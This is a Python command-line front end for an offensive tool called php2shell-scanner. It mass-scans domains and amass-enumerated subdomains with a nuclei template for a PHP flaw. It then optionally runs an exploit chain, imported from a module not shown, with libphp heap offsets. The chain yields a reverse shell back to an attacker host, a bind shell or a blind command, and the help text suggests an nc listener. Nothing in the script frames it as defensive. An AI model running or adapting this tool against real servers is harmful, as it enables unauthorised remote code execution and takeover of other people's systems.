#!/usr/bin/env python3

import argparse
import os
import re
import shutil
import ssl
import subprocess
import sys
import tempfile
import urllib.error
import urllib.parse
import urllib.request

# The nuclei template and paths.txt ship alongside this script (in the repo and
# in the Nix store).
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATE = os.path.join(SCRIPT_DIR, "php2shell.yaml")
DEFAULT_PATH_FILE = os.path.join(SCRIPT_DIR, "paths.txt")

USER_AGENT = "php2shell-scanner"

parser = argparse.ArgumentParser(
    prog="php2shell-scanner", description="Scan for php2shell"
)
parser.add_argument(
    "-t",
    "--target",
    action="append",
    default=[],
    help=(
        "A URL to scan as-is, e.g. http://example.com (may be given multiple "
        "times). Paths are never applied to --target."
    ),
)
parser.add_argument(
    "-d",
    "--domain",
    action="append",
    default=[],
    help="A domain to scan (may be given multiple times)",
)
parser.add_argument(
    "--subdomain",
    action="store_true",
    help="Enumerate and scan subdomains of each --domain with amass",
)
parser.add_argument(
    "-p",
    "--path",
    action="append",
    default=[],
    help=(
        "A URL path to probe on each --domain target (may be given multiple "
        "times). Does not apply to --target, which is scanned as-is."
    ),
)
parser.add_argument(
    "--path-file",
    help=(
        "File of URL paths to probe on each --domain target, one per line "
        "(blank lines and lines starting with '#' are ignored). Defaults to "
        "paths.txt in this repo."
    ),
)
parser.add_argument(
    "--log",
    help="Write findings (matched results only) to this file",
)
parser.add_argument(
    "--exploit",
    action="store_true",
    help=(
        "After the scanner verifies php2shell on a single --target, run the "
        "php2shell exploit chain against it to get a reverse shell (only "
        "usable with exactly one --target and no --domain). Start a listener "
        "first, e.g. nc -lvnp 4444."
    ),
)
parser.add_argument(
    "--lhost",
    help="Host for the target's reverse shell to connect back to (required with --exploit)",
)
parser.add_argument(
    "--lport",
    type=int,
    default=4444,
    help="Port for the reverse shell (default: 4444)",
)
parser.add_argument(
    "--command",
    help=(
        "With --exploit, run this single command (max 14 bytes, blind, no "
        "output) instead of a reverse shell, e.g. 'id>/out/p1'"
    ),
)
parser.add_argument(
    "--profile",
    choices=("official", "official83", "lab"),
    default="official",
    help="Target build profile with calibrated heap/libphp offsets (default: official)",
)
parser.add_argument(
    "--zif-offset",
    type=lambda x: int(x, 0),
    help="Offset of zif_system in libphp.so (overrides the profile)",
)
parser.add_argument(
    "--dtor-offset",
    type=lambda x: int(x, 0),
    help="Offset of ZVAL_PTR_DTOR in libphp.so (overrides the profile)",
)
parser.add_argument(
    "--htdata-offset",
    type=lambda x: int(x, 0),
    help="Chunk-relative offset of the 167-byte carrier string (overrides the profile)",
)
parser.add_argument(
    "--bind-port",
    type=int,
    help=(
        "With --exploit, start a bind shell listening on this port on the "
        "target instead of a reverse shell; the scanner connects to it and "
        "drives the session (no catch listener needed)"
    ),
)
parser.add_argument(
    "--no-serve",
    action="store_true",
    help=(
        "With --exploit/--bind-port, do not start the local script server; "
        "the script is assumed to be served already at --lhost/--lport"
    ),
)
parser.add_argument(
    "--retries",
    type=int,
    default=3,
    help="Exploit attempts per leak stage (default: 3)",
)
parser.add_argument(
    "--huge-mb",
    type=int,
    default=12,
    help="Size of the OOM field in MiB; must exceed the target's memory_limit (default: 12)",
)


def have(cmd):
    if shutil.which(cmd) is None:
        print("Missing " + cmd + " executable.")
        return False
    return True


def _ssl_context():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def validate_web_server(url):
    parsed = urllib.parse.urlparse(url)
    if parsed.scheme not in ("http", "https"):
        return False, "URL must start with http:// or https:// (got: " + url + ")"
    if not parsed.netloc:
        return False, "URL is missing a host (got: " + url + ")"

    ctx = _ssl_context()
    for method in ("HEAD", "GET"):
        req = urllib.request.Request(
            url, method=method, headers={"User-Agent": USER_AGENT}
        )
        try:
            with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
                return True, "responded HTTP " + str(resp.getcode())
        except urllib.error.HTTPError as exc:
            # The server answered (even a 4xx/5xx) so it is a web server.
            return True, "responded HTTP " + str(exc.code)
        except urllib.error.URLError as exc:
            reason = str(exc.reason)
            continue
        except (ValueError, OSError) as exc:
            reason = str(exc)
            continue
    return False, "no HTTP response: " + reason


def load_paths(args):
    paths = list(args.path)

    if args.path_file:
        path_file = args.path_file
        required = True
    else:
        path_file = DEFAULT_PATH_FILE
        required = False

    if os.path.isfile(path_file):
        with open(path_file) as fh:
            for line in fh:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                paths.append(line)
    elif required:
        parser.error("path file not found: " + path_file)
    elif not paths:
        print("Note: default path file not found (" + path_file + ").")

    seen = set()
    unique = []
    for path in paths:
        if path not in seen:
            seen.add(path)
            unique.append(path)
    return unique


def join_url(base, path):
    if not path:
        return base
    return base.rstrip("/") + "/" + path.lstrip("/")


def apply_paths(targets, paths):
    if not paths:
        return targets
    expanded = []
    for target in targets:
        for path in paths:
            expanded.append(join_url(target, path))
    return expanded


def enumerate_subdomains(domain):
    print("Enumerating subdomains for " + domain + " with amass...")
    try:
        result = subprocess.run(
            ["amass", "enum", "-passive", "-norecursive", "-d", domain],
            capture_output=True,
            text=True,
            check=False,
        )
    except OSError as exc:
        print("Failed to run amass: " + str(exc))
        return []

    if result.stdout:
        sys.stdout.write(result.stdout)
    if result.stderr:
        sys.stderr.write(result.stderr)

    pattern = re.compile(
        r"\b((?:[a-zA-Z0-9_-]+\.)+" + re.escape(domain) + r")\b"
    )
    hosts = set()
    for match in pattern.finditer(result.stdout):
        hosts.add(match.group(1).lower())
    # Always include the apex domain itself.
    hosts.add(domain.lower())
    return sorted(hosts)


def is_vulnerable(target):
    """Run the nuclei template against a single target; True if it matches."""
    fd, list_path = tempfile.mkstemp(prefix="php2shell-targets-", suffix=".txt")
    try:
        with os.fdopen(fd, "w") as fh:
            fh.write(target + "\n")
        result = subprocess.run(
            ["nuclei", "-silent", "-t", TEMPLATE, "-l", list_path],
            capture_output=True,
            text=True,
            check=False,
        )
    finally:
        os.unlink(list_path)

    findings = result.stdout.strip()
    if findings:
        print(findings)
    return bool(findings)


def run_nuclei(targets, log_path=None):
    if not targets:
        print("No targets to scan.")
        return 0

    if not os.path.isfile(TEMPLATE):
        print("Missing nuclei template: " + TEMPLATE)
        return 1

    print("Scanning " + str(len(targets)) + " target(s) for php2shell...")

    if log_path:
        log_dir = os.path.dirname(log_path)
        if log_dir:
            os.makedirs(log_dir, exist_ok=True)

    fd, list_path = tempfile.mkstemp(prefix="php2shell-targets-", suffix=".txt")
    try:
        with os.fdopen(fd, "w") as fh:
            fh.write("\n".join(targets) + "\n")
        cmd = ["nuclei", "-silent", "-t", TEMPLATE, "-l", list_path]
        if log_path:
            cmd += ["-o", log_path]
        result = subprocess.run(cmd, check=False)
        return result.returncode
    finally:
        os.unlink(list_path)

def run_exploit(args):
    """Verify the vulnerability on the single --target, then exploit it."""
    import exploit

    if len(args.target) != 1:
        parser.error("--exploit requires exactly one --target")
    if args.domain or args.subdomain:
        parser.error("--exploit cannot be combined with --domain/--subdomain")

    target = args.target[0]
    if not is_vulnerable(target):
        print("Vulnerability not verified on " + target + "; not exploiting.")
        return 1

    print("Vulnerability verified; starting exploit against " + target)
    kwargs = dict(
        profile=args.profile,
        zif_offset=args.zif_offset,
        dtor_offset=args.dtor_offset,
        htdata_offset=args.htdata_offset,
        huge_mb=args.huge_mb,
        retries=args.retries,
    )
    if args.command:
        if len(args.command.encode()) > exploit.MAX_CMD:
            print(
                "--command is limited to " + str(exploit.MAX_CMD)
                + " bytes by the forged carrier."
            )
            return 1
        ok = exploit.exploit_command(target, args.command, **kwargs)
    elif args.bind_port:
        if not args.lhost:
            parser.error("--bind-port needs --lhost (where the script is served), or pass --command")
        ok = exploit.exploit_bind(
            target, args.lhost, args.lport, args.bind_port,
            serve=not args.no_serve, **kwargs,
        )
    else:
        if not args.lhost:
            parser.error("--exploit needs --lhost (reverse shell target), or pass --command")
        ok = exploit.exploit_shell(target, args.lhost, args.lport, **kwargs)
    return 0 if ok else 1


def main():
    args = parser.parse_args()

    if not args.target and not args.domain:
        parser.error("provide --target and/or --domain")

    if args.exploit:
        # The exploit chain needs only the target URL; skip the amass check.
        if not have("nuclei"):
            print("Missing dependencies. Exiting.")
            sys.exit(1)
    else:
        # Check every dependency so all missing ones are reported at once,
        # rather than exiting on the first.
        required = ["nuclei", "amass"]
        missing = False
        for cmd in required:
            if not have(cmd):
                missing = True
        if missing:
            print("Missing dependencies. Exiting.")
            sys.exit(1)

    invalid = []
    for target in args.target:
        ok, detail = validate_web_server(target)
        if ok:
            print("Validated --target " + target + " (" + detail + ").")
        else:
            invalid.append(target + ": " + detail)
    if invalid:
        parser.error(
            "--target does not look like a web server:\n  "
            + "\n  ".join(invalid)
        )

    if args.exploit:
        sys.exit(run_exploit(args))

    paths = load_paths(args)

    # --target URLs are scanned exactly as given; path expansion only applies
    # to --domain targets.
    targets = list(args.target)

    domain_targets = []
    for domain in args.domain:
        if args.subdomain:
            domain_targets.extend(enumerate_subdomains(domain))
        else:
            domain_targets.append(domain)

    targets.extend(apply_paths(domain_targets, paths))

    seen = set()
    unique = []
    for target in targets:
        if target not in seen:
            seen.add(target)
            unique.append(target)

    sys.exit(run_nuclei(unique, args.log))


if __name__ == "__main__":
    main()
